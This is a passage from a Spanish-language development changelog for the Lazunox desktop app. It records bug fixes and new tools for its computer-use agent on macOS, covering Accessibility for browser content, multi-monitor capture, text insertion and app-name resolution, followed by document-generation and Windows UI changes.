  resuelve e instala solo (la lógica de `optionalDependencies` dice que debería, pero no se probó en
  una máquina Windows real todavía — el PC de pruebas por SSH que ya existe para la paridad Mac/Windows
  sería el lugar natural para esa prueba).

## F8-B148 — Cowork no podía tocar contenido web en segundo plano: bug real encontrado y arreglado

- **El dueño pegó una transcripción real de Cowork**: pidió reproducir un canal (TVN) en Yogui TV
  (una web) desde Brave — la tarea abrió la web bien, encontró el texto "TVN" visualmente por captura,
  pero **nunca pudo encontrarlo ni tocarlo por Accessibility** en modo "En segundo plano"; pidió
  "control real del ratón" (la única escalada que existe) y se quedó esperando sin que se la dieran.
  Pregunta del dueño: "¿por qué Cowork no funciona bien, investiga qué pasa realmente o quizás las
  tecnologías no son las correctas".
- **Investigado de punta a punta con evidencia real, no suposición** (mismo criterio que toda esta
  sesión — nunca se asumió "debe ser esto", se midió):
  1. Se reprodujo el caso EXACTO con el `cu-helper` real contra Brave real: `ax-tree` devolvía apenas
     ~435 nodos, **ninguno** de rol `AXWebArea` — es decir, NINGÚN contenido de la página (ni botones
     de Brave mismo en `brave://accessibility/`) se exponía, solo los controles nativos del navegador
     (barra de direcciones, botones de pestaña). Confirmado independiente con `System Events` de
     macOS (mismo resultado: 4 elementos nomás) — no era un bug de nuestro recorrido, era que
     Accessibility para el contenido web simplemente no se activaba.
  2. Se armó un script de Swift aislado para llamar directo a la API de Accessibility y mirar los
     códigos de error reales: `AXUIElementSetAttributeValue(app, "AXManualAccessibility", true)` — la
     llamada que `helper.swift` ya hacía, pensada para activar el árbol de apps Electron/Chromium —
     **devuelve el error `-25205` (`kAXErrorAttributeUnsupported`) en el elemento de la APLICACIÓN de
     Brave**. La llamada fallaba en silencio desde siempre (el código no miraba el resultado).
  3. Bajando nivel por nivel desde la ventana, se encontró CUÁL elemento sí acepta el atributo: no la
     app, no la ventana — un `AXGroup` varios niveles adentro (el contenedor real del contenido
     web/`WebContentsView` de Chromium). Activándolo ahí (código `0`, éxito), el árbol completo de la
     página apareció: 1 `AXWebArea`, y el texto "TVN" repetido como `AXStaticText` real, con acción
     `AXPress` disponible — exactamente lo que la tarea necesitaba y no podía encontrar.
  4. Conclusión: **no es un problema de tecnología** (Accessibility como camino SÍ funciona y es
     correcto para "segundo plano" sin tocar el ratón real) — es un bug concreto en `helper.swift`: el
     intento de activar `AXManualAccessibility` se hacía UNA sola vez, en el elemento equivocado (la
     app), en vez de intentarlo en cada nodo mientras se recorre el árbol (el único intento barato,
     sin necesidad de saber de antemano cuál nodo es "el correcto").
- **Arreglo**: `resources/computer-use/helper.swift` — el intento de `AXManualAccessibility` se movió
  de una llamada única al principio (`axTree`/`findElements`) a DENTRO del recorrido (`AXWalker.walk`,
  `FindElementsWalker.walk`, y también `resolveRef` por si el estado se perdió entre llamadas) — se
  intenta en TODOS los nodos visitados; en los que no lo soportan (la gran mayoría) es un error
  instantáneo e inofensivo, en el que sí lo soporta (el contenedor del contenido web) desbloquea todo
  lo de abajo. Afecta a LAS DOS herramientas de "segundo plano" que recorren el árbol: `app_tree` y
  `app_find`/`find_elements` — cualquier tarea futura con Brave/Chrome/Edge en segundo plano se
  beneficia, no solo este caso puntual.
- **Verificado con el binario real, no solo el script de prueba**: `cu-helper ax-find com.brave.Browser
'{"text":"TVN"}'` (la MISMA llamada que usaría `app_find` del MCP) ahora devuelve 4 coincidencias
  reales de "TVN" como `AXStaticText`, cada una con `actions:["AXPress",…]` y un `frame` válido — Cowork
  ya podría haber completado la tarea original sin pedir control real del ratón. `npx vitest run
src/main/computer`: 314 pruebas en verde (nada de TS cambió, el bug y el arreglo son puramente del
  helper nativo; sin test automatizado posible para esto — no hay arnés de pruebas para `helper.swift`
  en el repo, igual que el resto de los cambios nativos de Control del Mac — la verificación es la
  llamada real de arriba).
- **No verificado todavía**: que el dueño repita la tarea original de Yogui TV (u otra con contenido
  web en segundo plano) y confirme que ahora sí encuentra y toca las tarjetas sin pedir control real
  del ratón. También queda pendiente, igual que antes de este arreglo (anotado en F8-B140): la lista
  de apps "que nunca se ocultan", la verificación de que la app en primer plano coincide con el
  objetivo, y el tratamiento de apps de solo-píxeles (remoto/VMs) — esos son temas aparte, no
  relacionados con este bug puntual.

## F8-B149 — "Llevar Cowork al nivel de Claude": cuatro pendientes de F8-B140 resueltos de una

- **El dueño, satisfecho con el arreglo de F8-B148**: "sigue investigando cómo lo podemos llevar otro
  nivel al nivel de Claude, qué más nos estaría faltando" — y tras mostrarle dos gaps reales (bug de
  multi-monitor con evidencia real, falta de herramienta de zoom): "arregla todo porfa abarca todo no
  solo una parte". Se encararon los CUATRO pendientes que F8-B140 había dejado anotados a propósito,
  más los dos gaps nuevos de esta ronda — seis en total, cada uno investigado contra el código real
  antes de tocar nada (mismo criterio de toda la sesión).
- **1) "La lista de apps que nunca se ocultan incluía TODA concesión de siempre" (Discord seguía
  visible en tareas que no lo necesitaban)** — causa real: `nonGrantedBundleIds` (enmascarado de
  capturas en segundo plano) decidía "visible" = "tiene algún nivel concedido alguna vez", nunca
  "relevante para la tarea de AHORA". Arreglo: `service.ts` gana `taskApps` (por sesión, se llena
  cuando se aprueba una app por tarjeta o por Modo auto, se vacía con `revokePlan` — tarea nueva,
  lista nueva) y un endpoint nuevo `GET /task-apps?session=`; `mcp-platform-darwin.ts` lo consulta
  ANTES del criterio viejo (que se mantiene como respaldo legado sin sesión). 8 pruebas nuevas
  (`service-task-apps.test.ts`) + 2 en `mcp-platform-darwin.test.ts`.
- **2) "Verificación de que la app en primer plano coincide con el objetivo" (el "casi" de WhatsApp)**
  — `type_text`/`key` no tienen coordenadas que las anclen a una app (a diferencia de los clics, que
  ya validan la app BAJO el punto): si el foco cambió sin que el modelo lo notara, el texto se iba a
  la app equivocada sin ningún aviso. Arreglo: parámetro opcional `expect_app` en ambas herramientas
  (mismo criterio defensivo que ya usa `app_press` con `expectRole`/`expectTitle`) — si no coincide
  con la app en primer plano (sin distinguir mayúsculas, substring), NO escribe/pulsa nada y avisa
  claro. Nuevo escenario `expect-app` en el fixture de equivalencia (5 pasos, revisado línea por
  línea: coincide → escribe, no coincide → no escribe nada, sin distinguir mayúsculas, y sin
  `expect_app` sigue andando igual que siempre).
- **3) "Límite de tiempo en las llamadas de Accessibility"** — `helperExit` tiene un tope de 30s
  pensado para `type`/`screenshot-sck` (que sí pueden tardar), pero una consulta AX normal tarda
  milisegundos: si una app está congelada, esperar 30s por intento es carísimo. Arreglo:
  `withAxTimeout` (8s) envolviendo `ax-tree`/`ax-find`/`ax-frame`/`ax-press`/`ax-set-value`/
  `ax-action`/`find-elements` — el proceso nativo sigue su curso solo (lo limpia el mecanismo de
  siempre), esto solo deja de esperarlo del lado de Node.
- **4) Herramienta de "zoom" (la que tiene el toolset de Opus 4.5+ de Anthropic y Lazunox no tenía)**
  — nueva herramienta `zoom`: recorta y agranda (1-4x) una región de la ÚLTIMA captura completa, sin
  gastar una acción real. Nativo: `zoom-image` en `helper.swift` (crop + reescalado con interpolación
  de calidad alta vía CoreGraphics) — probado con el binario real compilado (recorte 200x150 → 2.5x
  → 500x375, JPEG real de 40KB). **Windows**: NO se improvisó código Rust sin poder compilarlo ni
  probarlo (no hay toolchain de Rust en esta máquina) — en vez de eso, `PlatformBackend` gana el
  método `zoomImage` (abstrae el detalle de plataforma, igual que `windowShot`); macOS lo implementa
  de verdad, Windows devuelve un error claro ("no disponible todavía, pedí una captura nueva") sin
  tocar el helper nativo de Rust. `protocol.json` documenta `zoom-image` como `win32: "none"` con el
  motivo (WIC pendiente, probar en máquina real antes de declararlo). La prueba de contrato que exige
  paridad estricta para todo comando que `mcp-server.ts` llama DIRECTO (sin pasar por el backend) fue
  justamente la que encontró que el diseño inicial estaba mal — se corrigió moviendo la llamada al
  backend, no debilitando la prueba.
- **5) Mensaje más claro cuando una coordenada "está fuera de la pantalla"** — la confusión real del
  caso de Yogui TV: el modelo intentó usar coordenadas de `app_find` (puntos de pantalla globales,
  pueden ser negativos con un monitor secundario) directo en una herramienta de clic (que espera
  píxeles de la última captura, siempre de la pantalla principal) — espacios de coordenadas
  distintos. El error de `toPoints` ahora lo explica así, y sugiere `app_press`/`app_action` en vez
  de insistir con un clic.
- **6) Multi-monitor "de verdad" (capturar/clicar en pantallas secundarias)**: investigado a fondo
  — `cu-helper screens` YA devuelve el x/y real de cada pantalla (confirmado en esta Mac: 3 monitores,
  uno a `x:-1080`), pero remover la bandera `-m` de `screencapture` para capturar el escritorio
  virtual completo NO dio lo esperado en una prueba real (seguía devolviendo solo 1920x1080, no el
  bounding box de los 3 monitores) — necesita más investigación de la que da este margen para
  hacerlo bien y probado. **Se dejó fuera a propósito** en vez de forzar algo sin verificar; el punto
  (5) de arriba cubre la parte más urgente (evitar clics mal dirigidos) sin necesitar esto.
- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa — 5905 pruebas en
  verde (23 skipped, Windows-only), mismo ruido ajeno `ENOEXEC`. `cu-helper` recompilado y probado a
  mano contra Brave real. App reiniciada.
- **No verificado todavía**: todo lo de arriba depende de interacción real con una tarea de Cowork de
  verdad para confirmar que se siente mejor en la práctica (especialmente `expect_app` y `zoom`, que
  requieren que el agente decida usarlos). El punto (6) (multi-monitor completo) queda como
  investigación pendiente, no como bug conocido sin arreglar.

## F8-B150 — El multi-monitor "completo" de F8-B149 — resuelto de verdad, con prueba en hardware real

- **El dueño probó el prompt de zoom/expect_app con una nota real** ("Notas" en segundo plano) y
  Cowork se encontró con el bug EXACTO que F8-B149 había dejado como "investigado pero no resuelto":
  el sistema decía bien "Notas está en primer plano", pero la captura seguía mostrando el escritorio
  — porque `screenshot` capturaba SIEMPRE la pantalla principal (`-m`), sin importar en qué monitor
  estuviera la ventana real. El dueño: "sabé que pasa si tiene más pantallas, el programa se marea...
  ahí queda la caga" — correcto, exactamente ahí.
- **Esta vez se resolvió de punta a punta, con la Mac real del dueño (3 monitores, uno en x negativa)
  como banco de pruebas**, retomando justo donde F8-B149 se había frenado (`screencapture` sin `-m` no
  capturaba el escritorio virtual completo, como se esperaba):
  - `screencapture -R<x>,<y>,<w>,<h>` (recorte por coordenadas GLOBALES, existe desde siempre, no
    estaba en el radar) SÍ captura cualquier monitor, confirmado con los 3 monitores reales de esta
    Mac (probado contra el monitor en `x:-1080`: devolvió exactamente 1080x1920, el tamaño real de esa
    pantalla).
  - `cu-helper screens` YA traía el x/y real de cada pantalla (no se usaba); ahora también trae
    `displayID` (necesario para el único hueco que quedaba: ScreenCaptureKit, que antes SIEMPRE tomaba
    `displays.first`, cualquiera que ScreenCaptureKit enumerara primero — ni la principal, ni
    necesariamente la de la app en primer plano. Verificado con el binario real: pedirle el display 3
    da 1080x1920, pedirle el 2 (principal) da 1920x1080).
  - `mcp-server.ts` gana `screenForCapture()`: antes de cada captura, mira en qué pantalla está REALMENTE
    la ventana de la app en primer plano (`frontmost` + `windows-of` + comparar contra `screens`) y le
    pide ESA al backend — no siempre la principal. De paso, unifica el pedido de `frontmost` con el de
    la pantalla en una sola función (antes `takeScreenshot` lo pedía en paralelo a la captura: dos
    llamadas, y una carrera real entre ambas que de hecho ROMPIÓ la prueba de equivalencia la primera
    vez que se probó esto — orden no determinista detectado y corregido ahí mismo, no ignorado).
  - `toPoints`/`ensureRatio` ahora usan la pantalla de la ÚLTIMA captura (no siempre la principal) para
    los límites y, al convertir a puntos, SUMAN su origen real — en la principal es (0,0), sin cambio
    alguno respecto a como era antes; en otra pantalla (p.ej. `x:-1080`), es lo que hace que el clic
    caiga en el punto global real en vez de fallar o caer en el lugar equivocado.
  - `shotText` ya no dice siempre "pantalla principal": si la captura es de otra pantalla, lo dice
    explícito, para que el modelo no asuma algo que no es cierto.
  - Windows sin cambios de comportamiento NI de orden de llamadas (su "escritorio virtual" ya es un
    espacio único): `screenForCapture` no hace las consultas de más ahí, y se verificó con una prueba
    de contrato exacta que el orden de comandos al helper no cambió ni un poquito.
- **Verificado con hardware real, no solo con dobles**: con Brave real puesto a propósito en el
  monitor de `x:-1080` (confirmado con `frontmost`/`windows-of` reales), se corrió la cadena completa
  (`frontmost` → `windows-of` → elegir pantalla → `screencapture -R`) con el binario compilado de
  verdad: eligió la pantalla 3 (`x:-1080`, 1080x1920) y la capturó con esas dimensiones EXACTAS — no
  una simulación, el flujo real contra el hardware real del dueño.
- **Verificado automatizado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa —
  5905 pruebas en verde (23 skipped, Windows-only), mismo ruido ajeno `ENOEXEC`. La prueba de
  equivalencia de macOS (antes flaky por la carrera de `frontmost` — confirmado corriéndola 3+ veces
  seguidas sin fallar tras el arreglo) y la de contrato de Windows (orden exacto de comandos) ambas en
  verde. `cu-helper` recompilado. App reiniciada.
- **No verificado todavía**: que el dueño repita la tarea de Notas (u otra con una app en un monitor
  secundario) y confirme que ahora la captura muestra la ventana real en vez del escritorio/otra app.

## F8-B151 — `app_insert_text`: agregar a una nota sin pedir control real del ratón

- **El dueño probó el prompt de Notas en segundo plano**: el multi-monitor de F8-B150 funcionó bien
  (el agente notó solo que la ventana estaba en otro monitor y la trajo al frente), pero se frenó en
  el paso final — para escribir "prueba ok" al final de la nota, `app_set_value` (lo único que había
  para escribir por accesibilidad) REEMPLAZA todo el valor del campo, y esa nota tenía un adjunto de
  audio ("Reproducir") que un reemplazo de texto plano podía perder. El agente, correctamente, no
  quiso arriesgarlo y pidió control real del ratón/teclado — que no se le dio, así que se quedó sin
  terminar. El dueño: "investiga en internet algo de código abierto... una buena función al nivel de
  Claude Code".
- **Investigado el código oficial de Anthropic** (`claude-quickstarts/computer-use-demo`,
  `tools/computer.py`) antes de asumir nada: confirmado que Claude NO tiene ningún control por
  accesibilidad — todo es teclado/mouse simulado (`xdotool`) sobre una sola pantalla X11 virtual (ni
  siquiera multi-monitor, que acá ya se resolvió en F8-B150). O sea: esto no es "ponerse al nivel de
  Claude" en el sentido de copiarle algo que tiene — es una debilidad propia de Lazunox (su modo
  segundo plano por Accessibility es más capaz que lo que Claude ofrece, pero tenía este hueco
  puntual) que vale la pena arreglar por sí misma.
- **La técnica correcta** (investigada y confirmada, no inventada): la API de Accessibility de macOS
  permite mover el "cursor" de edición con `AXSelectedTextRange` e insertar ahí con `AXSelectedText`
  — a diferencia de `AXValue` (lo que usa `app_set_value`), esto NO reemplaza todo el campo, inserta
  en el punto indicado y deja el resto (adjuntos, formato) intacto.
  - **Probado contra una nota real de Notas antes de tocar el código** (nunca contra la nota real del
    dueño — se creó y borró una nota de prueba propia): moví el cursor al final con
    `AXSelectedTextRange` e inserté con `AXSelectedText` usando un script de Swift aislado — funcionó
    exacto, el contenido original quedó intacto y el texto nuevo se agregó al final.
  - Nuevo comando nativo `ax-insert-text` en `helper.swift` (misma lógica, ya dentro del helper real) —
    recompilado y vuelto a probar contra una SEGUNDA nota de prueba, con el binario compilado de
    verdad: mismo resultado, agregó sin tocar el resto.
  - Nueva herramienta `app_insert_text` (hermana de `app_set_value`, mismas reglas de seguridad —
    rechaza campos seguros, "Control total" requerido) — el agente ahora puede elegir entre
    "reemplazar todo" (`app_set_value`) o "agregar al final sin tocar el resto"
    (`app_insert_text`), y la descripción de cada herramienta le dice cuándo usar cuál.
  - **Windows**: NO se improvisó el equivalente de UI Automation sin poder compilarlo ni probarlo (no
    hay `cargo` en esta máquina) — `app_insert_text` vive detrás de `PlatformBackend.insertAxText`
    (mismo patrón que `zoomImage` de F8-B149): macOS lo implementa de verdad, Windows falla con un
    mensaje claro ("no disponible todavía, usa app_set_value con cuidado o pide control real").
    `protocol.json` documenta `ax-insert-text` como `win32: "none"` con el motivo.
- **Pruebas**: 2 pasos nuevos en el fixture de equivalencia (`accesibilidad-app`: camino feliz, agrega
  8 caracteres; `codigos-de-salida-del-helper`: campo seguro, código 9) — ambos revisados a mano.
- **Verificado**: typecheck (los 4 proyectos) limpio, lint limpio, batería completa — 5905 pruebas en
  verde (23 skipped, Windows-only), mismo ruido ajeno `ENOEXEC`. `cu-helper` recompilado y probado DOS
  veces con notas reales de prueba (creadas y borradas por este mismo proceso, nunca con la nota real
  del dueño). App reiniciada.
- **No verificado todavía**: que el dueño repita la tarea de Notas completa (incluido el paso de
  escribir al final) y confirme que `app_insert_text` funciona en la práctica sin pedir control real
  — y que el agente elija usarla en vez de `app_set_value` para este tipo de caso.

## F8-B152 — El "se traba" de Notas no era un bug: faltaba documentar `zoom`/`app_insert_text`

- **El dueño repitió la tarea de Notas con el prompt que incluía `app_insert_text`**: el agente se
  frenó igual, esta vez porque la condición del prompt ("asegurándote primero de que Notas sigue
  siendo la app en primer plano") nunca se cumplía — `open_application`/`AXRaise` en segundo plano
  NUNCA activan de verdad la app (es a propósito, para no robarle el foco al usuario), así que la
  condición tal como estaba escrita era irrealizable. El dueño: "algo pasa wn de verdad, buscá en
  GitHub algo que podamos dejar esto pulido".
- **Investigado antes de tocar nada, y la conclusión es otra de la esperada**: `computer.md` (el
  manual que el propio agente lee) YA dice clarísimo que las herramientas `app_*` funcionan "sin
  activar la app ni robarle el foco al usuario" — `app_insert_text` nunca necesitó que Notas fuera
  la app en primer plano, eso fue una condición agregada en el PROMPT DE PRUEBA (mío, de esta
  sesión), no un requisito real de la herramienta. El agente simplemente obedeció al pie de la letra
  una condición mal puesta. No es un bug de Lazunox — es un prompt de prueba mal escrito.
- **Lo que SÍ era un gap real, encontrado al revisar el manual por este motivo**: ni `app_insert_text`
  (F8-B151, de hoy mismo) ni `zoom` (F8-B149) estaban documentadas en `computer.md` — el agente no
  tenía forma de saber que existían fuera de un prompt que las mencionara por nombre a propósito
  (como el mío). En una tarea real, sin ese empujón, el agente ni se enteraba. Arreglado:
  - `app_insert_text` documentada junto a `app_set_value`, explicando cuándo usar cada una
    (reemplazar todo vs. agregar sin tocar el resto) y qué hacer si falla.
  - `computer_zoom` documentada junto a `computer_screenshot`, aclarando que solo sirve sobre
    capturas de pantalla completa (no `app_screenshot`, que tiene su propio espacio de coordenadas)
    — la mezcla exacta que el dueño pidió en el prompt de prueba ("zoom" sobre una app en segundo
    plano) y que no podía funcionar así.
  - `expect_app` (F8-B149, `type_text`/`key`) también documentado — no tenía ninguna mención.
  - De paso, la descripción de `computer_screenshot` se actualizó: decía "pantalla principal"
    siempre, ahora dice lo que es desde F8-B150 (la pantalla con la app en primer plano).
- **Verificado**: `agent-prompts.test.ts`/`computer-agent.test.ts`/`opencode-config.test.ts` en verde
  (nada de esto tocaba su estructura de 10 pasos ni la lógica de distribución del archivo). App
  reiniciada para que la próxima tarea de Cowork use el manual actualizado.
- **No verificado todavía**: que una tarea real (sin un prompt que mencione `app_insert_text`/`zoom`
  por nombre) el agente las descubra y use solo, ahora que están en el manual.

## F8-B153 — "Notes" resolvía a un servicio auxiliar en vez de Notas: bug real de nombres, no de foco

- **El dueño probó una tarea difícil a propósito** (leer Spotify, escribir en Notas, buscar la hora
  en Brave, con multi-monitor y `app_insert_text` de por medio). Spotify salió perfecto. Pero en
  Notas: "el árbol de Notas salió vacío (resolvió a un servicio auxiliar)" — el agente pidió la app
  por su nombre en INGLÉS ("Notes", natural para un LLM, aunque el resto del prompt decía "Notas" en
  español) y `resolve-app` devolvió `com.apple.LinkedNotesUIService` (un proceso de fondo sin
  ventana, no la app real) con `found: true` — de ahí para adelante, nada podía funcionar.
- **Reproducido con el helper real antes de asumir nada**: `cu-helper resolve-app "Notes"` daba
  exactamente ese bundle id erróneo; `resolve-app "Notas"` (español) sí daba `com.apple.Notes`
  correcto. La hipótesis inicial (que el buscador de Spotlight al final de `resolveApp` lo causaba)
  resultó ser INCORRECTA al investigar más — el motivo real es más simple y más interesante:
  `LinkedNotesUIService` es un proceso de verdad corriendo de fondo (sin ventana, invisible en
  `running-apps`, pero presente en la lista completa de `NSWorkspace.runningApplications` que usa
  `resolveApp`), y "notes" es literalmente una subcadena de su propio nombre
  ("Linked**Notes**UIService") — la comparación "parcial" que ya existía (`contains`) lo atrapaba
  antes de llegar a ningún otro chequeo.
- **Arreglo real**: el bundle id de una app casi siempre queda en inglés sin importar el idioma del
  sistema (`com.apple.Notes` sigue siendo así aunque el Mac esté en español y la app se vea como
  "Notas") — se agregó una comparación por el ÚLTIMO SEGMENTO del bundle id ("Notes" de
  "com.apple.Notes") y, más importante, se la puso ANTES de la comparación parcial/floja que ya
  existía (no después): una coincidencia exacta de nombre o de sufijo de bundle id es una señal más
  fuerte que "la subcadena aparece en el nombre de cualquier proceso corriendo", y debe ganarle.
  Mismo cambio en `resolveApp` (usada por `request_access`/`app_*`) y `findRunningApp` (usada por
  `activate`), mismo orden en las dos.
- **Verificado con el binario real, no solo en teoría**: `cu-helper resolve-app "Notes"` ahora da
  `com.apple.Notes` (antes `com.apple.LinkedNotesUIService`); `"Notas"`, `"Brave"` y `"Spotify"`
  siguen dando lo mismo que antes (sin regresión). Batería completa de `src/main/computer` en verde
  — 325 pruebas (este bug y su arreglo son puramente nativos, sin fixture/mock que lo cubra; la
  verificación es la llamada real de arriba).
- **No verificado todavía**: que el dueño repita la tarea completa y confirme que pedir "Notes" (o
  cualquier app con nombre distinto entre inglés y el idioma del sistema) ya encuentra la app
  correcta de punta a punta.

## F8-B154 — `open_application` ignoraba el control real ya concedido para la sesión

- **El dueño pegó una transcripción real de una tarea con Discord** donde, aunque ya se le había
  concedido control real (`request_full_control`) dentro de la misma tarea, al pedir abrir/activar
  Discord después el agente seguía comportándose como si estuviera en modo "En segundo plano": la
  app nunca llegaba de verdad al frente. Comparado contra la misma tarea resuelta por Claude (sin
  ese problema), confirmó que era un bug real de Lazunox, no una limitación de Discord.
- **Causa real, encontrada revisando el código, no adivinada**: `controlMode(session)` devuelve DOS
  datos independientes — `mode` (la preferencia GLOBAL de la persona: "En segundo plano" vs "Control
  de la pantalla") y `foreground` (si ESTA sesión en particular ya recibió control real temporal vía
  `request_full_control`, sin importar la preferencia global). El resto del código (`requireForeground`,
  el propio handler de `request_full_control`) ya usaba correctamente los dos: `mode === 'background'
  && !foreground`. Pero la herramienta `open_application` solo miraba `mode`, así que aunque
  `foreground` fuera `true` seguía tomando la rama de "abrir sin activar" (`open-app-bg`) como si
  nunca se hubiera concedido nada.
- **Arreglo**: en `mcp-server.ts`, `open_application` ahora desestructura también `foreground` y usa
  la misma condición de dos factores que ya usaban `requireForeground`/`request_full_control`
  (`mode === 'background' && !foreground`) en vez de mirar solo `mode`.
- **Verificado**: revisados los tres únicos lugares de `mcp-server.ts` que llaman a `controlMode` —
  los otros dos ya estaban bien, el bug estaba aislado a este. Agregado el escenario
  `segundo-plano-con-control-concedido` a `mcp-server.equivalence.test.ts` (preferencia global en
  "En segundo plano" pero `foreground: true` para la sesión) — el fixture regenerado confirma que
  ahora `open_application` hace la secuencia real `open-app`+`activate`+`frontmost` (no `open-app-bg`)
  y devuelve "App en primer plano: Notes", igual que en modo "Control de la pantalla". Batería
  completa de `src/main/computer` en verde (326 pruebas, la nueva incluida) y batería del repo
  completo (`src/renderer src/main src/shared`, 5906 pruebas) sin regresión. `typecheck`/`lint`/
  `prettier` limpios. App de desarrollo reiniciada.
- **No verificado todavía**: que el dueño repita la tarea real de Discord (pedir control real,
  luego pedir abrir/activar la app) y confirme que ahora sí llega al frente de verdad.

## F8-B155 — multi-monitor otra vez: una ventana auxiliar de la misma app podía ganarle a la real

- **Con F8-B154 ya probado en vivo** (el dueño reprodujo el escenario exacto de Discord: pidió
  control real, luego pidió abrir y traer Discord al frente), el `open_application`/`activate` SÍ
  activó Discord de verdad (confirmado: `frontmost` devolvía Discord, `AXRaise` aplicado, la
  ventana "Amigos - Discord" existía con `hasWindow: true`) — pero las capturas de pantalla
  COMPLETA seguían mostrando el escritorio con OTRO monitor (la vertical, con Spotify en la barra
  de menús), mientras una captura de LA VENTANA (`window-shot`, sin pasar por selección de
  pantalla) sí mostraba Discord bien. El dueño, cansado de parches a ciegas, pidió explícitamente
  buscar cómo lo resuelven proyectos de código abierto reales antes de tocar nada más.
- **Investigado con las propias apps reales de esta Mac (3 monitores) antes de tocar código**:
  `cu-helper windows-of com.hnc.Discord` con la ventana real de Discord devolvía correctamente su
  posición (224,62, 1696×928, dentro de la pantalla principal) — un intento manual exacto del mismo
  camino que usa `screenForCapture` (activar → esperar 800 ms → `windows-of` → `screencapture -R`
  con esos límites) SÍ mostró Discord bien en la captura. O sea: el bug real no es reproducible de
  forma determinista con el estado actual — depende de que exista, en el momento exacto de la
  captura, una ventana AUXILIAR de la misma app (overlay de notificaciones, HUD, panel flotante —
  Discord tiene varias) que la gane en orden z y quede como `wins[0]` de `windowsOf`, llevando a
  `screenForCapture` a la pantalla de ESA ventana en vez de la de contenido real.
- **Investigación en código abierto real, como pidió el dueño**: comparado contra Hammerspoon
  (`hs.window`, `extensions/window/libwindow.m`) y Peekaboo (steipete/Peekaboo, herramienta de
  capturas por ventana en macOS). Ambos coinciden en el mismo criterio para distinguir "ventana de
  contenido real" de HUD/overlay/panel-flotante: la CAPA de la ventana (`kCGWindowLayer`) — las
  ventanas normales de app son capa 0, los overlays/HUD/paneles flotantes casi siempre no — más un
  umbral de transparencia (`kCGWindowAlpha`). Hammerspoon lo hace indirectamente (se queda con las
  ventanas "por debajo del Dock", que de hecho excluye todo lo que vive en capas superiores);
  Peekaboo lo hace explícito: primer filtro `kCGWindowLayer == 0`, descarta además `alpha ≤ 0.01`.
  Nuestro `windowsOf()` (`helper.swift`) no filtraba por NINGUNO de los dos — tomaba cualquier
  ventana on-screen de la app, sin distinguir HUD de contenido real.
- **Arreglo, con la misma base real investigada**: `windowsOf()` ahora descarta ventanas con
  `kCGWindowLayer != 0` o `kCGWindowAlpha ≤ 0.01` — mismo criterio que Hammerspoon/Peekaboo. Afecta
  a las DOS cosas que usan esta función: la selección de pantalla de `screenForCapture` (el bug de
  hoy) y el enmascarado de apps no concedidas en la captura compuesta (F8-B149) — en ambos casos
  solo nos interesa la ventana de contenido real, nunca un overlay. Además, de paso: `screenForCapture`
  elegía la pantalla mirando si el CENTRO de la ventana caía dentro de sus límites — un criterio que
  falla con una ventana cerca del borde entre dos monitores. Cambiado al criterio estándar (mismo
  que usa Hammerspoon): la pantalla con MÁS ÁREA de solapamiento real con la ventana, no un punto.
- **Verificado**: recompilado `cu-helper`; `windows-of` repetido contra Discord, Brave, Spotify y
  Notas reales (las cuatro apps de la tarea original) sigue devolviendo exactamente la misma ventana
  de contenido de antes — sin regresión (ninguna de ellas tenía un overlay activo ahora mismo para
  probar el caso exacto que lo disparó, así que el filtro no tenía nada que descartar en esta
  pasada, pero tampoco rompió nada). Batería completa de `src/main/computer` en verde (326 pruebas,
  el cambio de área-de-solapamiento no rompió ningún escenario del fixture de equivalencia).
  `typecheck`/`lint`/`prettier` limpios. App de desarrollo reiniciada con el helper recompilado.
- **No verificado todavía**: el caso exacto que lo disparó (una ventana auxiliar de Discord —u otra
  app— presente justo en el momento de la captura) no se pudo forzar de forma determinista desde
  acá sin tocar configuración de Discord del dueño. Falta que el dueño repita una tarea real de
  Discord con multi-monitor (ideal: con una notificación o el overlay de voz activo) y confirme que
  la captura de pantalla completa ya muestra lo mismo que `window-shot` mostraba bien.

## F8-B156 — ArtCraft reemplaza a LibreOffice para crear y mostrar documentos del Chat

- **Qué cambia**: el Chat arma `.pptx`, `.xlsx` y `.docx` con `deckcraft-cli`, `gridcraft-cli` y `wordcraft-cli` (instalación con tamaño y SHA-256 fijados en `resources/craft/pin.json`; en macOS además firma de desarrollador) y el panel muestra la versión web de cada programa en una vista aislada y local (`web-server.ts`, `web-view.ts`). Se eliminó LibreOffice del código y de los paquetes.
- **Pruebas**: `craft-install.test.ts`, `chat-deck.test.ts`, `chat-grid.test.ts`, `chat-word.test.ts`, `web-server.test.ts`, `web-open.test.ts`, `chat-doc-contract.test.ts`; instalación real y generación de los tres documentos comprobadas en Windows y macOS.
- **No verificado todavía**: la revisión de seguridad formal de las vistas web; el gráfico «Margen mensual» (valores iguales) no se vio en el panel de Excel de un usuario.

## F8-B157 — diapositivas nuevas, transiciones, Excel con estilo, «Abrir aparte» y lectura tolerante del JSON del modelo

- **Qué cambia**: diseños `timeline`, `agenda`, `quote` y `table` y `transition` (`fade`, `push`, `wipe`); las cajas de texto se achican solas si no caben (`autoFitSize`); Excel con encabezado oscuro, filas alternadas, líneas finas y fila de totales; botón «Abrir aparte» (`open-external.ts`); `parseLenient` y `normalizePptx` corrigen deslices del modelo antes de validar.
- **Pruebas**: `chat-deck.test.ts`, `open-external.test.ts`, `json-lenient.test.ts`, `chat-doc-normalize.test.ts`, `chatDocBlocks.test.ts`, contrato IPC.

## F8-B158 — arreglos de Windows: animaciones, «Permitir» y botones de ventana

- **Qué cambia**: los indicadores de «trabajando» no se apagan con `prefers-reduced-motion` (Windows lo informa en sesiones remotas); la visibilidad de la tarjeta de permiso se mide en cada vuelta, porque las tarjetas más altas que la ventana nunca se armaban; las cabeceras dejan sitio a los controles de ventana.
- **Pruebas**: E2E `permisos-escritorio.e2e.ts` (comando de 70 líneas, falla con el código anterior), verificación en la app real de Windows.

## F8-B159 — Overdrive (antes Tareas) y lista vertical de modos

- **Qué cambia**: el nombre del modo en toda la interfaz, el atajo y los prompts del asistente; la barra lateral muestra los modos en lista con ícono. Los identificadores internos (p. ej. la distro `Lazunox-Tareas`) no cambian.
- **Pruebas**: `Sidebar.render.test.tsx`, `i18n.test.ts` y los E2E de arranque, idioma, atajos y catálogo MCP.

## F8-B160 — arrastrar una carpeta, clic derecho y créditos

- **Qué cambia**: `dropFolder` valida con `tasks:folders:check` y sigue el camino de «Elegir carpeta»; menú contextual con deshacer, cortar, copiar, pegar y seleccionar todo (`edit-context-menu.ts`); «Acerca de» con creadores y créditos.
